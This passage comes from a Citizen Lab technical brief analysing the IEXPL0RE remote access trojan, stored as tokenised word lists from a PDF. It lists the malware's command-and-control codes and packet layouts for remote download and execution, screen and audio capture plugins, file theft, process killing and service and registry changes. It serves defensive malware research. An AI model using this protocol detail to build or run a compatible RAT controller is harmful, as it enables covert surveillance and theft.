"steal", "data", "every"], ["day", ",", "but", "are", "both", "avoidable", "and", "correctable", "."], ["The", "IEXPL0RE", "RAT", "is", "under", "active", "development", ",", "as", "both", "the", "client", "and", "server", "components", "are"], ["continuously", "changing", ".", "The", "server", "in", "particular", "has", "exhibited", "different", "behavior", "over", "time", ",", "mostly"], ["related", "to", "blocking", "unauthorized", "access", "from", "the", "outside", "world", ".", "For", "example", ",", "the", "redirect", "to", "Microsoft\u2019s", "website", "when", "referencing", "an", "invalid", "URL", "was", "not", "present", "when", "this", "investigation", "began", ".", "The"], ["presence", "of", "development", "work", "or", "upgrades", "implies", "that", "this", "system", "is", "actively", "used", "and", "monitored", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["APPENDIX", "A:", "CONFIGURATION", "FILE"], ["The", "configuration", "sent", "to", "the", "C2", "server", "on", "initial", "connection", "has", "the", "client", "configuration", "at", "the"], ["beginning", "(figure", "11)", ",", "followed", "by", "more", "information", "about", "the", "infected", "computer", "(figure", "12)", "."], ["FIGURE", "11:", "CLIENT", "CONFIGURATION", "SENT", "TO", "C2"], ["15"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["FIGURE", "12:"], ["DETAILED", "INFORMATION", "ON", "INFECTED", "COMPUTER", "SENT", "TO", "C2"], ["16"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["17"], ["APPENDIX", "B:", "COMMAND", "ENUMERATION"], ["The", "following", "is", "a", "list", "of", "all", "commands", "present", "in", "the", "IEXPL0RE", "malware", ",", "and", "a", "detailed"], ["description", "of", "what", "data", "is", "received", "or", "sent", "over", "the", "network", "for", "each", "command", "."], ["CODE"], ["COMMAND"], ["SERVER", "/"], ["DESCRIPTION"], ["CLIENT"], ["0x00"], ["Failure"], ["C"], ["Client", "response", "for", "a", "variety", "of", "commands", "to", "indicate", "that", "the", "operation", "did"], ["not", "succeed", "."], ["0x01"], ["Success"], ["C"], ["Client", "response", "for", "a", "variety", "of", "commands", "to", "indicate", "that", "the", "operation", "succeeded", ".", "Contains", "variable", "data", "related", "to", "the", "command", "request", "."], ["0x01"], ["Reply", "file", "does", "not", "exist"], ["C"], ["Reply", "file", "for", "plugin", "does", "not", "exist", "."], ["Packet", "contains:"], ["[4]", "-", "Command", "code", "(0x01)"], ["0x02"], ["Reply", "file", "over", "512kB"], ["C"], ["Reply", "file", "for", "plugin", "is", "over", "512kB", "."], ["Packet", "contains:"], ["[4]", "-", "Command", "code", "(0x02)"], ["0x03"], ["Reply", "file"], ["C"], ["Reply", "file", "for", "plugin", "."], ["Packet", "contains:"], ["[var]", "-", "buffer", "--", "implemented", "so", "always", "0", "?"], ["0x03"], ["Shutdown"], ["S"], ["Sends", "a", "shutdown", "+", "power", "off", "+", "force", "command", "to", "the", "system", ".", "Requires"], ["parameters", "0/0", "."], ["0x04"], ["Reboot"], ["S"], ["Sends", "a", "reboot", "+", "force", "command", "to", "the", "system", ".", "Requires", "parameters", "0/0", "."], ["0x06"], ["Reconnect"], ["S"], ["Disconnects", "open", "connections", "and", "reconnects", "."], ["0x07"], ["Shut", "off", "display"], ["S"], ["Sends", "WM_SYSCOMMAND", "message", "SC_MONITORPOWER", "to", "shut", "off", "the"], ["display", "."], ["0x0B"], ["Download", "and", "install"], ["malware"], ["S"], ["Downloads", "a", "file", ",", "writes", "it", "to", "disk", ",", "and", "possibly", "executes", "it", "."], ["Packet", "contains:"], ["[4]", "-", "executable", "size"], ["[var]", "-", "executable"], ["Depending", "on", "configuration", "and", "AV", "software", "present", ",", "writes", "the", "file", "to", "IEXPL0RE", ".", "EXE", "(in", "application", "data", "folder", ",", "Microsoft", "subfolder)", ",", "fxsst", ".", "dll", "(in", "Windows", "system", "directory)", ",", "or", "SENS64", ".", "DLL", "(in", "temp", "path)", ".", "May", "run", "IEXPL0RE", "."], ["EXE", "depending", "on", "options;", "may", "also", "install", "configuration", "file", "(STREAM", ".", "SYS"], ["or", "Cache)", "."], ["Returns", "failure", "or", "success", "with", "parameters", "0/0", "."], ["0x0C"], ["Install", "dropped", "files"], ["S"], ["Checks", "configuration", "file", "options", "and", "moves", "the", "appropriate", "dropped", "files", "to"], ["the", "correct", "locations", "(may", "vary", "depending", "on", "Windows", "version)", "."], ["Returns", "failure", "or", "success", "with", "parameters", "0/0", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x0D"], ["Update", "configuration"], ["file"], ["S"], ["18"], ["Downloads", "new", "configuration", "parameters", "and", "writes", "the", "updated", "information"], ["to", "the", "configuration", "file", "."], ["Packet", "option", "2:"], ["[2]", "-", "Value1", "==", "2"], ["[180]", "-", "Unused", "?"], ["Packet", "option", "1:", "update", "campaign", "name", "?"], ["[2]", "-", "Value1", "==", "1"], ["[4]", "-", "campaign", "name", "length"], ["[var]", "-", "campaign", "name"], ["Packet", "option", "4:", "update", "configuration", "file"], ["[2]", "-", "Value1", "==", "4"], ["[2]", "-", "port"], ["[2]", "-", "unknown", "(offset", "264)"], ["[2]", "-", "unknown", "(offset", "266)"], ["[4]", "-", "unknown", "(offset", "664)"], ["[1]", "-", "unknown", "(offset", "274)"], ["[1]", "-", "unknown", "(offset", "534)"], ["[2]", "-", "unknown", "(offset", "532)"], ["[2]", "-", "unknown", "(offset", "270)"], ["[2]", "-", "unknown", "(offset", "272)"], ["[4]", "-", "campaign", "name", "length"], ["[var]", "-", "campaign", "name"], ["[4]", "-", "C2", "name", "length"], ["[var]", "-", "C2", "name"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(unused", "?", ")"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(offset", "275)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(offset", "535)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(offset", "599)"], ["Returns", "failure", "or", "success", "with", "parameters", "0/0", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x0E"], ["Download", "and", "run"], ["plugin"], ["S"], ["19"], ["Opens", "a", "new", "connection", "in", "a", "new", "thread", ",", "downloads", "a", "file", ",", "then", "runs", "it", "(possibly"], ["with", "Internet", "Explorer", "credentials)", ".", "This", "looks", "like", "a", "plugin", "activation", "for", "screen"], ["captures", "and", "audio", "recording", "--", "references", "offscreen", ".", "dll", "and", "offsound", ".", "dll."], ["Packet", "contains:"], ["[4]", "-", "unknown", "(field_4)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_8)"], ["[4]", "-", "DLL", "name", "length"], ["[var]", "-", "DLL", "name"], ["[4]", "-", "DLL", "arguments", "length"], ["[var]", "-", "DLL", "arguments"], ["[4]", "-", "Reply", "filename", "length"], ["[var]", "-", "Reply", "filename"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_620)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_724)"], ["[1]", "-", "unknown", "(field_828)"], ["[1]", "-", "unknown", "(field_829)"], ["[1]", "-", "unknown", "(field_82A)"], ["[1]", "-", "Add", "process", "ID", ",", "socket", ",", "verb", "to", "DLL", "arguments", "?"], ["[1]", "-", "Create", "process", "as", "IE", "user", "?"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_82C)"], ["[4]", "-", "unknown", "(field_934)"], ["Handshake", "for", "the", "new", "connection", "uses", "connection", "number", "-1", "."], ["If", "the", "connection", "is", "successful", ",", "replies", "with", "a", "failure", "packet", ",", "parameters", "0/0", ","], ["containing:"], ["[4]", "-", "unknown", "(field_4)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_8)"], ["[4]", "-", "DLL", "name", "length"], ["[var]", "-", "DLL", "name"], ["[4]", "-", "Reply", "filename", "length"], ["[var]", "-", "Reply", "filename"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_620)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_724)"], ["[1]", "-", "unknown", "(field_828)"], ["[1]", "-", "unknown", "(field_829)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_82C)"], ["[4]", "-", "unknown", "(field_934)"], ["If", "successful", ",", "it", "will", "send", "the", "C2", "an", "X", "command", ".", "The", "C2", "will", "reply", "with", "a"], ["file", ",", "which", "the", "client", "writes", "to", "disk", ".", "The", "client", "will", "send", "a", "success", "or", "failure"], ["packet", "with", "parameters", "0/0", "depending", "on", "whether", "the", "file", "was", "received", "."], ["If", "field_828", "is", "non-zero", ",", "the", "client", "will", "send", "the", "contents", "of", "the", "reply", "filename", "specified", "in", "a", "0x03", "command", "with", "parameters", "0/0", ".", "The", "way", "this", "is"], ["implemented", ",", "it", "appears", "as", "if", "it", "will", "always", "send", "an", "empty", "packet", "."], ["If", "process", "creation", "is", "unsuccessful", ",", "it", "will", "send", "a", "failure", "packet", "with", "parameters", "0/0", "containing", "the", "following:"], ["[4]", "-", "command", "(0x00)"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x0F"], ["Download", "and", "execute"], ["file"], ["S"], ["Downloads", "a", "file", "and", "runs", "it", "."], ["Packet", "contains:"], ["[4]", "-", "executable", "size"], ["[var]", "-", "executable"], ["Downloads", "the", "file", "to", "%temp%", "and", "executes", "it", ".", "Returns", "failure", "or", "success"], ["with", "parameters", "0/0", "."], ["0x10"], ["Unknown"], ["S"], ["Updates", "a", "values", "in", "the", "lock", ".", "dat", "file", "and", "sets", "an", "event", "."], ["Packet", "contains:"], ["[4]", "-", "Value", "length"], ["[var]", "-", "Value"], ["Sets", "the", "DWORD", "at", "lock", ".", "dat", "offset", "516", "to", "2", ",", "and", "copies", "the", "value", "from", "the"], ["packet", "to", "offset", "520", ".", "Sets", "the", "USERMODECMD", "event", "."], ["0x11"], ["Unknown"], ["S"], ["Reads", "a", "value", "out", "of", "%temp%/screenlog", ".", "txt."], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "0/0", "depending", "on"], ["whether", "the", "value", "read", "equals", "1", ".", "The", "command", "contains:"], ["[4]", "-", "Value"], ["Where", "value", "equals:"], ["0", ":", "file", "does", "not", "exist"], ["3", ":", "value", "read", "from", "file", "equals", "1"], ["4", ":", "value", "read", "from", "file", "equals", "0"], ["5", ":", "value", "read", "from", "file", "equals", "2"], ["0x12"], ["Unknown"], ["S"], ["Reads", "a", "value", "out", "of", "%temp%/offsoundlog", ".", "txt."], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "0/0", "depending", "on"], ["whether", "the", "value", "read", "equals", "1", ".", "The", "command", "contains:"], ["[4]", "-", "Value"], ["Where", "value", "equals:"], ["0", ":", "file", "does", "not", "exist"], ["3", ":", "value", "read", "from", "file", "equals", "1"], ["4", ":", "value", "read", "from", "file", "equals", "0"], ["5", ":", "value", "read", "from", "file", "equals", "2"], ["0x1E"], ["sub_10004603()"], ["C"], ["If", "not", "empty", ",", "packet", "contains:"], ["[2]", "-", "_WIN32_FIND_DATAA", "structure", "length"], ["[var]", "-", "Data", "for", "file", "name"], ["If", "empty", ",", "packet", "contains:"], ["[2]", "-", "Set", "to", "0"], ["[1]", "-", "1", "if", "structure", "size", ">", "40000", ",", "0", "if", "failure"], ["Parameters", "are", "set", "to", "Res1/Res2", "."], ["20"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x20"], ["Move", "file"], ["S"], ["21"], ["Moves", "a", "file", "or", "directory", "."], ["Packet", "contains:"], ["[4]", "-", "Source", "length"], ["[var]", "-", "Source"], ["[4]", "-", "Destination", "length"], ["[var]", "-", "Destination"], ["Returns", "failure", "or", "success", "with", "parameters", "1/Res1"], ["0x21"], ["Delete", "file"], ["S"], ["Deletes", "a", "file", "or", "directory", "."], ["Packet", "contains:"], ["[4]", "-", "File", "name", "length"], ["[var]", "-", "File", "name"], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "Res2/Res1", "."], ["0x22"], ["Create", "directory"], ["S"], ["Creates", "a", "directory", "."], ["Packet", "contains:"], ["[4]", "-", "Path", "name", "length"], ["[var]", "-", "Path", "name"], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "Res2/Res1", "."], ["0x23"], ["GetSystemInfo", "request"], ["S"], ["Requests", "client", "to", "send", "a", "0x24", "response", "with", "the", "output", "of", "GetSystemInfo()", "."], ["0x24"], ["GetSystemInfo", "response"], ["C"], ["Contains", "a", "_SYSTEM_INFO", "struct", "with", "the", "output", "of", "GetSystemInfo()", "."], ["0x26"], ["Get", "document", "paths"], ["S"], ["Gets", "paths", "for", "CSIDL", "special", "folders", "PERSONAL", "(My", "Documents)", ",", "DESKTOPDIRECTORY", "(Desktop)", ",", "and", "HISTORY", "(Internet", "history)", "."], ["Returns", "a", "success", "command", "containing:"], ["[4]", "-", "My", "Documents", "path", "length"], ["[var]", "-", "My", "Documents", "path"], ["[4]", "-", "Desktop", "path", "length"], ["[var]", "-", "Desktop", "path"], ["[4]", "-", "Internet", "history", "path", "length"], ["[var]", "-", "Internet", "history", "path"], ["Parameters", "are", "set", "to", "1/Res1", "."], ["0x29"], ["Move", "file", "or", "directory"], ["S"], ["Moves", "a", "file", "or", "directory", "."], ["Packet", "contains:"], ["[4]", "-", "Source", "length"], ["[var]", "-", "Source"], ["[4]", "-", "Destination", "length"], ["[var]", "-", "Destination"], ["Returns", "failure", "or", "success", "with", "parameters", "1/Res1", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x2A"], ["Set", "file", "access", "time", "and"], ["attributes"], ["S"], ["22"], ["Sets", "the", "creation", "time", ",", "last", "access", "time", ",", "last", "write", "time", ",", "and", "file", "attributes", "of"], ["a", "file", "."], ["Packet", "contains:"], ["[8]", "-", "CreationTime"], ["[8]", "-", "LastAccessTime"], ["[8]", "-", "LastWriteTime"], ["[4]", "-", "dwFileAttributes"], ["[4]", "-", "File", "name", "length"], ["[var]", "-", "File", "name"], ["Returns", "failure", "or", "success", "with", "parameters", "Res2/Res1", "."], ["0x2B"], ["Unknown"], ["S"], ["Does", "some", "file-walking", ",", "including", "across", "all", "drives", "available", "(A", "to", "Z)", ".", "Replies"], ["with", "a", "0x2C", "command", "followed", "by", "a", "number", "of", "0x2D", "commands", "."], ["Packet", "contains:"], ["[4]", "-", "Directory", "length"], ["[var]", "-", "Directory"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown"], ["0x2C"], ["Unknown", "start", "response"], ["C"], ["Response", "to", "the", "0x2B", "command", ".", "Uses", "parameters", "Res2/Res1", "."], ["Packet", "contains:"], ["[4]", "-", "Number", "of", "0x2D", "packets", "to", "follow"], ["0x2D"], ["Unknown", "response"], ["C"], ["Response", "to", "the", "0x2B", "command", ".", "Uses", "parameters", "Res2/Res1", "."], ["Packet", "contains:"], ["[4]", "-", "Unknown", "data", "length"], ["[var]", "-", "Unknown", "data", ",", "result", "of", "sub_10001B73()"], ["0x2F"], ["Owner", "name", ",", "organization", ",", "and", "serial", "number"], ["request"], ["S"], ["0x46"], ["Read", "from", "file"], ["S"], ["0x47"], ["Read", "from", "file", "response"], ["C"], ["Sends", "the", "owner", "name", ",", "organization", ",", "and", "serial", "number", "."], ["Returns", "a", "success", "response", "with", "the", "following", "data:"], ["[4]", "-", "Username", "length"], ["[var]", "-", "Username"], ["[4]", "-", "User", "organization", "length"], ["[var]", "-", "User", "organization"], ["[4]", "-", "Serial", "length"], ["[var]", "-", "Serial"], ["Packet", "contains:"], ["[8]", "-", "File", "offset"], ["[2]", "-", "Characters", "to", "read"], ["[4]", "-", "Length", "of", "field", "3"], ["[var]", "-", "Field", "3"], ["Replies", "with", "a", "0x47", "packet", "containing", "data", "from", "a", "file", "."], ["Response", "to", "0x46", "that", "contains", "data", "from", "a", "file", ".", "Sent", "with", "parameters", "2/2", "."], ["Packet", "contains:"], ["[2]", "-", "Size"], ["[var]", "-", "Data"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x4B"], ["List", "files"], ["S"], ["Lists", "files", "in", "a", "given", "directory", "along", "with", "file", "size", "and", "last", "write", "times", "."], ["Packet", "contains"], ["[4]", "-", "Directory", "length"], ["[var]", "-", "Directory"], ["0x4C"], ["Start", "of", "list", "files"], ["response"], ["C"], ["Start", "of", "list", "response", "to", "0x4B", ".", "Sent", "with", "parameters", "2/2", "."], ["Packet", "has", "no", "payload", "."], ["0x4D"], ["End", "of", "list", "files"], ["response"], ["C"], ["End", "of", "list", "response", "to", "0x4B", ".", "Sent", "with", "parameters", "2/2", "."], ["Packet", "has", "no", "payload", "."], ["0x4E"], ["List", "files", "response"], ["C"], ["List", "item", "for", "response", "to", "0x4B", ".", "Sent", "with", "parameters", "2/2", "."], ["Packet", "contains:"], ["[8]", "-", "FindFileData", ".", "nFileSizeLow,", "FindFileData", ".", "nFileSizeHigh"], ["[8]", "-", "", ".", "ftLastWriteTime.dwLowDateTime,", "", ".", "dwHighDateTime"], ["[4]", "-", "length", "of", "next", "field"], ["[var]", "-", "whole", "string:", "filename", "plus", "size", "and", "write", "time"], ["0x4F"], ["Open", "file"], ["S"], ["Opens", "a", "specified", "file", "for", "use", "with", "0x46", "[and", "friends]", "."], ["23"], ["Packet", "contains:"], ["[4]", "-", "File", "name", "length"], ["[var]", "-", "File", "name"], ["[4]", "-", "File", "mode", "length"], ["[var]", "-", "File", "mode"], ["Returns", "failure", "or", "success", "with", "parameters", "2/2", "."], ["0x50"], ["Close", "file"], ["S"], ["Closes", "file", "opened", "with", "0x4F", "command", ".", "No", "response", "sent", "."], ["0x5A"], ["Start", "of", "running", "program", "list"], ["C"], ["Response", "to", "0x5D", "command", "that", "signals", "the", "start", "of", "a", "list", "of", "running", "programs", "."], ["Packet", "is", "empty", "with", "parameters", "3/Res1", "."], ["0x5B"], ["End", "of", "running", "program", "list"], ["C"], ["0x5C"], ["Running", "program"], ["C"], ["Response", "to", "0x5D", "command", "that", "signals", "the", "end", "of", "a", "list", "of", "running", "programs", "."], ["Packet", "is", "empty", "with", "parameters", "3/Res1", "."], ["Response", "to", "0x5D", "command", "that", "contains", "the", "first", "executable", "module", "for", "a"], ["single", "process", ".", "One", "packet", "is", "sent", "per", "process", "."], ["Packet", "contains:"], ["[24]", "-", "PROCESSENTRY32", ".", "th32ProcessID"], ["[4]", "-", "length", "of", "executable", "module", "name"], ["[var]", "-", "length", "of", "executable", "module"], ["0x5D"], ["List", "running", "programs"], ["S"], ["Sends", "a", "list", "of", "executable", "names", "for", "running", "processes", ".", "Replies", "with", "a", "0x5A"], ["response", ",", "followed", "with", "a", "0x5C", "packet", "for", "each", "executable", ",", "and", "ends", "with", "a"], ["0x5B", "response", "."], ["Client", "uses", "the", "CreateToolhelp32Snapshot()", "API", "function", "followed", "by", "Process32First()/Process32Next()", "to", "list", "all", "processes", ".", "The", "executable", "name", "is"], ["the", "module", "name", "returned", "by", "Module32First()", "."], ["0x5E"], ["Kill", "process"], ["S"], ["Kills", "a", "running", "process", "."], ["Packet", "contains:"], ["[4]", "-", "Process", "ID"], ["Returns", "failure", "or", "success", "with", "parameters", "3/Res1", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x5F"], ["Run", "program"], ["S"], ["24"], ["Runs", "a", "program", "already", "present", "on", "the", "client", "."], ["Packet", "contains:"], ["[4]", "-", "Command", "line", "length"], ["[var]", "-", "Command", "line"], ["Returns", "success", "or", "failure", "with", "parameters", "3/Res1", "."], ["0x72"], ["Unknown", "-", "open", "connection", "B", "?"], ["S"], ["Creates", "multiple", "new", "threads", "and", "a", "new", "C2", "connection", "(via", "full", "handshake)"], ["with", "connection", "number", "11", "."], ["Packet", "contains:"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown", "value", "(if", "0", "<", "length", "<", "80000)"], ["Returns", "success", "or", "failure", "with", "parameters", "11/11", ".", "If", "successful", ",", "contains"], ["the", "following", "payload:"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown", "(v2", "+", "808)"], ["[4]", "-", "Unknown", "value"], ["0x73"], ["Unknown", "-", "remove", "connection", "B", "?"], ["S"], ["May", "relate", "to", "uninstalling", "."], ["Packet", "contains:"], ["[4]", "-", "Process", "ID"], ["Kills", "the", "process", "with", "given", "process", "ID", ",", "and", "closes", "a", "socket", ".", "Returns", "success"], ["or", "failure", "with", "parameters", "11/11", ".", "If", "failure", ",", "contains", "the", "following", "payload:"], ["[4]", "-", "Process", "ID"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown", "(v2", "+", "808)"], ["0x82"], ["Number", "of", "services"], ["C"], ["Response", "to", "0x85", "command", "with", "the", "number", "of", "services", "on", "the", "system", "."], ["Packet", "contains:"], ["[4]", "-", "Number", "of", "services", "returned", "by", "EnumServicesStatusA()"], ["Response", "parameters", "are", "5/5", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x84"], ["Service", "information"], ["C"], ["25"], ["Response", "to", "0x85", "command", "with", "details", "on", "a", "service", "."], ["Packet", "contains:"], ["[4]", "-", "Service", "handle"], ["[4]", "-", "Current", "state"], ["[4]", "-", "Start", "type"], ["[4]", "-", "Error", "control"], ["[4]", "-", "Length", "of", "service", "name"], ["[var]", "-", "Service", "name"], ["[4]", "-", "Length", "of", "service", "display", "name"], ["[var]", "-", "Service", "display", "name"], ["[4]", "-", "Length", "of", "service", "binary", "path"], ["[var]", "-", "Service", "binary", "path"], ["[4]", "-", "Length", "of", "service", "description"], ["[var]", "-", "Service", "description"], ["[4]", "-", "Length", "of", "service", "start", "name"], ["[var]", "-", "Service", "start", "name"], ["Response", "parameters", "are", "5/5", "."], ["0x85"], ["List", "services"], ["S"], ["Lists", "all", "services", "on", "the", "system", ".", "Sends", "a", "0x82", "response", "with", "the", "number", "of"], ["services", ",", "then", "0x84", "responses", "with", "service", "details", "."], ["0x86"], ["Start", "service"], ["S"], ["Starts", "a", "service", "on", "the", "system", "."], ["Packet", "contains:"], ["[4]", "-", "Length", "of", "service", "name"], ["[var]", "-", "Service", "name"], ["Returns", "success", "with", "parameters", "5/5", "if", "service", "is", "started", "."], ["0x87"], ["Control", "service"], ["S"], ["Sends", "a", "control", "message", "to", "a", "service", "on", "the", "system", "."], ["Packet", "contains:"], ["[4]", "-", "Length", "of", "service", "name"], ["[var]", "-", "Service", "name"], ["[4]", "-", "Service", "control", "parameter"], ["Service", "control", "parameters", "are:"], ["1", "-", "stop"], ["2", "-", "pause"], ["3", "-", "continue"], ["Returns", "success", "with", "parameters", "5/5", "with", "the", "payload:"], ["[4]", "-", "Service", "current", "state"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x88"], ["Create", "service"], ["S"], ["26"], ["Creates", "a", "new", "service", "on", "the", "system", "."], ["Packet", "contains:"], ["[4]", "-", "Service", "name", "length"], ["[var]", "-", "Service", "name"], ["[4]", "-", "Display", "name", "length"], ["[var]", "-", "Display", "name", "(set", "in", "CreateServiceA())"], ["[4]", "-", "Binary", "path", "name", "length"], ["[var]", "-", "Binary", "path", "name"], ["[4]", "-", "Display", "name", "length"], ["[var]", "-", "Display", "name", "(set", "by", "ChangeServiceConfig2A())"], ["[4]", "-", "Start", "type"], ["Returns", "success", "or", "failure", "with", "parameters", "5/5", ".", "If", "success", ",", "contains", "the", "following", "payload:"], ["[4]", "-", "Service", "handle"], ["[4]", "-", "Current", "state"], ["[4]", "-", "Start", "type"], ["[4]", "-", "Error", "control"], ["[4]", "-", "Length", "of", "service", "name"], ["[var]", "-", "Service", "name"], ["[4]", "-", "Length", "of", "service", "display", "name"], ["[var]", "-", "Service", "display", "name"], ["[4]", "-", "Length", "of", "service", "binary", "path"], ["[var]", "-", "Service", "binary", "path"], ["[4]", "-", "Length", "of", "service", "description"], ["[var]", "-", "Service", "description"], ["[4]", "-", "Length", "of", "service", "start", "name"], ["[var]", "-", "Service", "start", "name"], ["0x89"], ["Delete", "service"], ["S"], ["Deletes", "a", "service", "from", "the", "system", "."], ["Packet", "contains:"], ["[4]", "-", "Service", "name", "length"], ["[var]", "-", "Service", "name"], ["Returns", "success", "or", "failure", "with", "parameters", "5/5", "."], ["0x8A"], ["Set", "service", "options"], ["S"], ["Changes", "the", "display", "name", "and", "start", "type", "of", "a", "service", "."], ["Packet", "contains:"], ["[4]", "-", "Service", "name", "length"], ["[var]", "-", "Service", "name"], ["[4]", "-", "Display", "name", "length"], ["[var]", "-", "Display", "name", "(max", "256", "chars)"], ["[4]", "-", "Display", "name", "length"], ["[var]", "-", "Display", "name", "(max", "512", "chars)"], ["[4]", "-", "Service", "start", "type"], ["Returns", "success", "or", "failure", "with", "parameters", "5/Res2"], ["0x96"], ["Enumerate", "registry"], ["keys"], ["S"], ["Opens", "a", "registry", "key", "and", "enumerates", "its", "subkeys", ".", "Replies", "with", "an", "0x97"], ["packet", "with", "subkey", "information", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x97"], ["Enumerate", "registry"], ["keys", "response"], ["C"], ["27"], ["Contains", "a", "list", "of", "all", "the", "subkey", "names", "for", "a", "given", "registry", "key", "."], ["Packet", "contains:"], ["[4]", "-", "Number", "of", "subkeys", "(N)"], ["[var", ",", "N", "times]", ":", "[4]", "-", "Subkey", "name", "length"], ["[var]", "-", "Subkey", "name"], ["Parameters", "are", "set", "to", "6/6", "."], ["0x98"], ["Registry", "key", "last", "write"], ["time", "query"], ["S"], ["Requests", "the", "last", "write", "time", "on", "a", "specified", "registry", "key", "and", "returns", "the", "information", "in", "a", "0x99", "packet", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["0x99"], ["Registry", "key", "last", "write"], ["time", "response"], ["C"], ["Contains", "the", "last", "write", "time", "of", "a", "registry", "key", "."], ["Packet", "contains:"], ["[8]", "-", "Last", "write", "time", "(_FILETIME", "structure)"], ["Parameters", "are", "set", "to", "6/6", "."], ["0x9A"], ["Enumerate", "registry", "key"], ["values"], ["S"], ["Opens", "a", "registry", "key", "and", "enumerates", "its", "values", ".", "Replies", "with", "a", "0x9B", "packet"], ["with", "the", "number", "of", "values", "and", "maximum", "size", "values", ".", "Sends", "a", "0x9C", "packet"], ["for", "each", "value", ",", "then", "signifies", "the", "end", "of", "the", "list", "with", "a", "0x9D", "packet", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["0x9B"], ["Start", "of", "registry", "key"], ["value", "enumeration", "list"], ["C"], ["Response", "to", "the", "0x9A", "command", "signifying", "the", "start", "of", "a", "registry", "key", "value"], ["enumeration", "."], ["Packet", "contains:"], ["[4]", "-", "Number", "of", "values", "associated", "with", "the", "registry", "key"], ["[4]", "-", "Max", "value", "name", "length"], ["[4]", "-", "Max", "value", "length"], ["Parameters", "are", "set", "to", "6/6", "."], ["0x9C"], ["Registry", "key", "value", "enumeration", "item"], ["C"], ["Response", "to", "the", "0x9A", "command", "signifying", "a", "registry", "key", "value", "."], ["Packet", "contains:"], ["[4]", "-", "Type"], ["[4]", "-", "Value", "name", "size"], ["[var]", "-", "Value", "name"], ["[4]", "-", "Value", "data", "size"], ["[var]", "-", "Value", "data"], ["Parameters", "are", "set", "to", "6/6", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x9D"], ["End", "of", "registry", "key"], ["value", "enumeration", "list"], ["C"], ["Response", "to", "the", "0x9A", "command", "signifying", "the", "end", "of", "a", "registry", "key", "value"], ["enumeration", "."], ["Parameters", "are", "set", "to", "6/6", "."], ["0x9F"], ["Delete", "registry", "key"], ["value"], ["S"], ["Deletes", "a", "value", "from", "a", "registry", "key", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["[4]", "-", "Registry", "key", "value", "length"], ["[var]", "-", "Registry", "key", "value"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", "."], ["0xA0"], ["Change", "registry", "key"], ["value"], ["S"], ["Changes", "a", "value", "of", "a", "registry", "key", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["[4]", "-", "Registry", "key", "old", "value", "length"], ["[var]", "-", "Registry", "key", "old", "value"], ["[4]", "-", "Registry", "key", "new", "value", "length"], ["[var]", "=", "Registry", "key", "new", "value"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", "."], ["0xA1"], ["Create", "empty", "registry"], ["key", "value"], ["S"], ["Creates", "a", "registry", "key", "value", "of", "a", "specified", "type", "with", "no", "value", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["[4]", "-", "Registry", "key", "value", "name", "length"], ["[var]", "-", "Registry", "key", "value", "name"], ["[4]", "-", "Registry", "key", "value", "type"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", "."], ["0xA2"], ["Create", "registry", "key"], ["S"], ["Creates", "a", "registry", "key", ".", "Can", "be", "a", "subkey", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", 